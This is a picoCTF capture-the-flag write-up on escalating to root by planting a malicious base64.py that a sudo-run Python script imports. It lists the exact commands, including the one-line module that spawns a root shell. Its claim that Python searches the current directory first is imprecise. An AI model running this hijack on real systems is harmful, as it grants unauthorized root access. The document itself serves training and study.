# Python Library Hijacking

**Platform:** picoCTF  
**Technique:** Python Module Hijacking / Privilege Escalation  
**Difficulty:** Easy-Medium  

## Challenge Description

A Python script running as root imports the `base64` module. By placing a malicious `base64.py` in the current directory, we can hijack the import and execute arbitrary code with root privileges.

## Vulnerability

Python searches for modules in the current directory before system paths. The script `.server.py` is run as root via `sudo` without a password. By creating a `base64.py` file with malicious code, we can execute commands as root when the script runs.

## Exploitation

### Step 1: Check Sudo Rights

```bash
sudo -l
```
Output shows we can run .server.py as root without a password.

Step 2: Examine the Script
```bash
cat /home/picoctf/.server.py
```
The script imports base64, os, and socket. It runs ping and does some base64 encoding.

Step 3: Create Malicious Module
```bash
echo 'import os; os.system("/bin/bash")' > base64.py
```
This creates a base64.py file that spawns a root shell when imported.

Step 4: Run the Script as Root
```bash
sudo /usr/bin/python3 /home/picoctf/.server.py
```
When Python imports base64, it loads our malicious file instead of the system module, spawning a root shell.

Step 5: Find the Flag
```bash
find / -name "*flag*" 2>/dev/null
```
cat /root/.flag.txt
